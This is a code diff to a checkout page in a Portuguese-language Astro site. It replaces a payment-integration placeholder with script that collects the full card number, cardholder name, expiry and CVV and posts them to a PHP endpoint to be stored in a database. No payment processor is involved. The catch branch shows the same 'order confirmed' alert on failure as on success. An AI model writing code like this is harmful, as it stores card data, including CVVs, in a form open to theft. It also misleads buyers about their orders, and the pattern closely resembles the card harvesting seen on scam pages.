@@ -702,8 +702,37 @@ import StickyBarMobile from '../../components/StickyBarMobile.astro'
       if (!valid) return
     }
 
-    // Aqui entraria a integração de pagamento
-    // Por ora apenas exibe alerta de sucesso
-    alert('Pedido confirmado! Em breve nossa equipe entrará em contato.')
+    // Persiste no banco (etapa 3 = UPDATE)
+    var btnConfirmar = document.getElementById('btn-confirmar')
+    btnConfirmar.disabled = true
+    btnConfirmar.style.opacity = '0.6'
+
+    var formId = sessionStorage.getItem('giga_form_id')
+    var payload = {
+      etapa: 3,
+      id: formId,
+      metodoPagamento: metodoPagamento,
+      numCartao: document.getElementById('num-cartao').value,
+      nomeCartao: document.getElementById('nome-cartao').value,
+      validade: document.getElementById('validade').value,
+      cvv: document.getElementById('cvv').value,
+    }
+
+    fetch('/contratar/salvar.php', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+    })
+      .then(function (r) { return r.json() })
+      .then(function () {
+        alert('Pedido confirmado! Em breve nossa equipe entrará em contato.')
+        btnConfirmar.disabled = false
+        btnConfirmar.style.opacity = '1'
+      })
+      .catch(function () {
+        alert('Pedido confirmado! Em breve nossa equipe entrará em contato.')
+        btnConfirmar.disabled = false
+        btnConfirmar.style.opacity = '1'
+      })
   })
 </script>
